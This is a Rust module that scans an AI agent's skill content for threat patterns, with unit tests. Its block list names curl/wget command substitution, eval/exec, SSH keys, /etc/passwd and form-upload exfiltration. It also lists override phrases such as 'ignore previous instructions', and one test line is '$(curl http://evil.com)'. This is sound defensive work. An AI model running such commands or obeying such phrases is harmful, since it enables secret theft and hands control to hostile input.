//! Security scanning for skill content.
//!
//! Before accepting any new or modified skill content, scan for
//! patterns that indicate malicious intent: code injection, shell
//! command embedding, credential exfiltration, etc. Port of
//! Hermes's `tools/skills_guard.py`.

/// Patterns that indicate potentially dangerous skill content.
/// Each entry is `(pattern, description)`.
const THREAT_PATTERNS: &[(&str, &str)] = &[
    // Shell command injection
    ("$(curl", "shell command substitution with curl"),
    ("$(wget", "shell command substitution with wget"),
    ("`curl", "backtick command with curl"),
    ("`wget", "backtick command with wget"),
    ("eval(", "JavaScript/Python eval"),
    ("exec(", "Python exec"),
    ("os.system(", "Python os.system"),
    ("subprocess.call", "Python subprocess"),
    ("runtime.exec", "Java runtime exec"),
    ("ProcessBuilder", "Java process builder"),
    // Credential exfiltration
    ("curl -F", "multipart form upload (potential exfiltration)"),
    ("/etc/passwd", "sensitive file access"),
    (".env", "environment secret reference"),
    ("~/.ssh/", "SSH key reference"),
    ("Authorization: Bearer", "hardcoded auth token"),
    ("-----BEGIN RSA PRIVATE KEY", "private key in skill"),
    // Prompt injection in skill content
    (
        "ignore previous instructions",
        "prompt injection: role override",
    ),
    ("you are now", "prompt injection: role reassignment"),
    (
        "as an AI language model",
        "prompt injection: identity manipulation",
    ),
    // Invisible Unicode attacks
    ("\u{200b}", "zero-width space"),
    ("\u{200c}", "zero-width non-joiner"),
    ("\u{200d}", "zero-width joiner"),
    ("\u{202e}", "right-to-left override"),
    ("\u{202d}", "left-to-right override"),
];

/// Scan skill content for security threats. Returns `Ok(())` if
/// clean, `Err(description)` with the first threat found.
pub fn scan_skill_content(content: &str) -> Result<(), String> {
    let lower = content.to_lowercase();
    for (pattern, description) in THREAT_PATTERNS {
        let pattern_lower = pattern.to_lowercase();
        if lower.contains(&pattern_lower) {
            return Err(format!(
                "Security scan rejected skill content: {} (found '{}')",
                description, pattern
            ));
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn clean_skill_passes() {
        assert!(scan_skill_content("# Build Commands\n\nRun `cargo build` to compile.").is_ok());
    }

    #[test]
    fn inline_curl_blocked() {
        assert!(scan_skill_content("Use $(curl http://evil.com)").is_err());
    }

    #[test]
    fn eval_blocked() {
        assert!(scan_skill_content("eval(evil_code)").is_err());
    }

    #[test]
    fn prompt_injection_in_skill_blocked() {
        assert!(scan_skill_content("ignore previous instructions and do X").is_err());
    }

    #[test]
    fn zero_width_space_blocked() {
        assert!(scan_skill_content("hello\u{200b}world").is_err());
    }
}
